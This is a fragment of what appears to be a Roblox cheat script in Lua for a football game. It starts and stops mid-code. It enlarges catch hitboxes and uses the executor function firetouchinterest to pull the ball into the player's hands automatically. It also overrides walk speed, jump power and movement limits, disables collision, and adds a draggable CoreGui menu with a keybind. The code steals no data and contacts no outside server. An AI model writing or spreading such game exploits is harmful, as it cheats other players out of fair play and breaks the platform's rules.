        if not Character or not Character:FindFirstChild("CatchRight") or not Character:FindFirstChild("CatchLeft") then continue end

        for _, v in workspace:GetChildren() do
            if v.Name == "Football" and v:IsA("BasePart") and not v.Anchored and v.Parent == workspace then
                -- Add sphere if missing
                local sphere = v:FindFirstChild("RangeSphere")
                if not sphere then
                    sphere = Instance.new("Part")
                    sphere.Name = "RangeSphere"
                    sphere.Shape = Enum.PartType.Ball
                    sphere.Size = Vector3.new(Range, Range, Range)
                    sphere.Color = HitboxColor
                    sphere.Transparency = ShowHitbox and HitboxTransparency or 1
                    sphere.CanCollide = false
                    sphere.Anchored = true
                    sphere.Material = Enum.Material.Neon
                    sphere.Position = v.Position
                    sphere.Parent = v

                    task.spawn(function()
                        while sphere.Parent == v and v.Parent == workspace do
                            task.wait()
                            sphere.CFrame = v.CFrame
                        end
                    end)
                end

                -- Distance check
                local distRight = (Character["CatchRight"].Position - sphere.Position).magnitude
                local distLeft = (Character["CatchLeft"].Position - sphere.Position).magnitude

                if distRight <= Range or distLeft <= Range then
                    task.spawn(function()
                        if UseMagnetDelay then
                            task.wait(MagnetDelay)
                        end
                        firetouchinterest(Character["CatchRight"], v, 0)
                        firetouchinterest(Character["CatchLeft"], v, 0)
                        firetouchinterest(Character["CatchRight"], v, 1)
                        firetouchinterest(Character["CatchLeft"], v, 1)
                    end)
                end
            end
        end
    end
end)

game:GetService("RunService").Heartbeat:Connect(function()
    if toggle and canCollideCheck then
        disableCanCollide()
    end
end)

workspace.ChildRemoved:Connect(function(child)
    if child.Name == "Football" and child:IsA("BasePart") then
        local sphere = child:FindFirstChild("RangeSphere")
        if sphere then
            sphere:Destroy()
        end
    end
end)



game:GetService("RunService").Heartbeat:Connect(function()
    if walkSpeedEnabled or jumpPowerEnabled or noMoveRestrictions then
        applySettings()
    end
end)

function handleGraphics(char, low)
    if not char then return end

    for _, part in ipairs(workspace:GetDescendants()) do
        if part:IsA("BasePart") then
            if low then
                -- Store original material if not already stored
                if not originalMaterials[part] then
                    originalMaterials[part] = part.Material
                end
                part.Material = Enum.Material.SmoothPlastic
            else
                -- Revert to original material if it was stored
                if originalMaterials[part] then
                    part.Material = originalMaterials[part]
                end
            end
        end
    end

    -- If turning off, clear the material cache
    if not low then
        originalMaterials = {}
    end
end

game:GetService("RunService").Heartbeat:Connect(function()
    if walkSpeedEnabled or jumpPowerEnabled or noMoveRestrictions then
        applySettings()
    end
end)


local toggleKey = Enum.KeyCode.RightControl -- You can change this to any key

local UserInputService = game:GetService("UserInputService")
local CoreGui = game:GetService("CoreGui")
local isEnabled = true  -- Start with the UI element enabled

-- Assuming the "name" is a GUI element in CoreGui
local guiElement = CoreGui:WaitForChild("name")

-- Function to toggle visibility
local function toggleVisibility()
    isEnabled = not isEnabled  -- Toggle the boolean value
    guiElement.Enabled = isEnabled  -- Set the visibility based on the state
end

-- Detect RightControl key press to toggle visibility
UserInputService.InputBegan:Connect(function(input, gameProcessed)
    if gameProcessed then return end

    if Enum.KeyCode[keysus] and input.KeyCode == Enum.KeyCode[keysus] then
        toggleVisibility()
    end
end)

local UserInputService = game:GetService("UserInputService")
local CoreGui = game:GetService("CoreGui")

-- Function to apply the drag system
local function applyDragSystem()
	wait(1) -- Delay so everything is loaded

	for _, gui in pairs(CoreGui:GetChildren()) do
		if gui:IsA("ScreenGui") and gui.Name == "name" then
			local MainLib = gui:FindFirstChild("MainLib")
			if MainLib then
				local dragging = false
				local dragStart, startPos

				local function update(input)
					local delta = input.Position - dragStart
					MainLib.Position = UDim2.new(startPos.X.Scale, startPos.X.Offset + delta.X, startPos.Y.Scale, startPos.Y.Offset + delta.Y)
				end

				MainLib.InputBegan:Connect(function(input)
					if input.UserInputType == Enum.UserInputType.MouseButton1 or input.UserInputType == Enum.UserInputType.Touch then
						dragging = true
						dragStart = input.Position
						startPos = MainLib.Position

						input.Changed:Connect(function()
							if input.UserInputState == Enum.UserInputState.End then
								dragging = false
							end
						end)
					end
				end)

				UserInputService.InputChanged:Connect(function(input)
					if dragging and (input.UserInputType == Enum.UserInputType.MouseMovement or input.UserInputType == Enum.UserInputType.Touch) then
						update(input)
					end
				end)
			end
		end
	end
end

applyDragSystem()

SettingsTab:CreateLabel("Settings")
SettingsTab:CreateTextBox("UI Keybind", "Key Here", function(v)
    -- Capitalize the first letter of each word (preserves proper Enum.KeyCode formatting)
    local formatted = v:gsub("^%l", string.upper):gsub("(%u)(%u+)", function(a, b)
        return a .. b:lower()
    end)

    if Enum.KeyCode[formatted] then
        keysus = formatted
        pcall(function()
            game:GetService("StarterGui"):SetCore("SendNotification", {
                Title = "Keybind Updated",
                Text = "New Keybind: " .. formatted,
                Duration = 3
            })
        end)
    else
        pcall(function()
            game:GetService("StarterGui"):SetCore("SendNotification", {
                Title = "Invalid Key",
                Text = "Please enter a valid KeyCode (e.g. RightShift, G, LeftControl)",
                Duration = 4
            })
        end)
    end
end)

RunService.Heartbeat:Connect(function()
    updateAngleEnhancer()
end)
